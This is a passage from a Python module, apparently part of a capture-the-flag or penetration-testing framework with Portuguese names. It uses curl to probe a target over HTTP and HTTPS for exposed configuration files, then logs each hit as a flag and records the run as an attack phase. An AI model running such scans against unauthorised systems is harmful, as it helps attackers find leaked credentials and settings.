                    arquivos_encontrados.append({'arquivo': arquivo, 'url': url, 'metodo': 'HTTP'})
                    self.log("CONFIG_SEARCH", f"✅ Arquivo encontrado via HTTP: {url}")
                    self.reportar_bandeira_disponivel(
                        "Arquivo de Configuração Exposto",
                        f"{arquivo} acessível via HTTP"
                    )

                # Tenta HTTPS
                url_https = f"https://{self.target}/{arquivo}"
                response = subprocess.run(
                    ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}', '-k', url_https],
                    capture_output=True,
                    text=True,
                    timeout=10
                )

                if response.stdout == '200':
                    arquivos_encontrados.append({'arquivo': arquivo, 'url': url_https, 'metodo': 'HTTPS'})
                    self.log("CONFIG_SEARCH", f"✅ Arquivo encontrado via HTTPS: {url_https}")
                    self.reportar_bandeira_disponivel(
                        "Arquivo de Configuração Exposto",
                        f"{arquivo} acessível via HTTPS"
                    )

            except Exception as e:
                continue

        if arquivos_encontrados:
            self.log("CONFIG_SEARCH", f"✅ {len(arquivos_encontrados)} arquivos de configuração expostos")
            self.marcar_bandeira(f"{len(arquivos_encontrados)} arquivos de config expostos", "Config Search")
        else:
            self.log("CONFIG_SEARCH", "Nenhum arquivo de configuração exposto")

        # Salva ataque no banco de dados
        self._salvar_ataque_no_banco(
            attack_type='config_search',
            attack_phase='fase_5',
            target_port=80,
            target_service='http',
            payload='buscar_arquivos_config_expostos',
            success=len(arquivos_encontrados) > 0,
            response_data={'arquivos': arquivos_encontrados},
            duration_ms=0,
            error_message=None if arquivos_encontrados else 'Nenhum arquivo de configuração exposto'
        )

        return {'sucesso': True, 'arquivos': arquivos_encontrados}

    def iniciar(self):
        """Inicia módulo de arsenal."""
        self.running = True
        self.log("INICIO", f"Módulo ARSENAL iniciado para {self.target}")

    def parar(self):
        """Para módulo de arsenal."""
        self.running = False
        self.log("FIM", "Módulo ARSENAL encerrado")

    def get_status(self):
        """Retorna status atual."""
        return self.status.copy()

    def salvar_estado(self):
        """Salva estado atual."""
        estado_file = "data/reports/arsenal_state.json"
        os.makedirs(os.path.dirname(estado_file), exist_ok=True)

        with open(estado_file, 'w') as f:
            json.dump(self.status, f, indent=2)

    def carregar_estado(self):
        """Carrega estado salvo."""
        estado_file = "data/reports/arsenal_state.json"

        if os.path.exists(estado_file):
            try:
                with open(estado_file, 'r') as f:
                    self.status = json.load(f)
            except:
                pass


# Teste do módulo
if __name__ == "__main__":
    arsenal = ArsenalModule()
    arsenal.log("TESTE", "Módulo Arsenal carregado")
    print(arsenal.get_status())
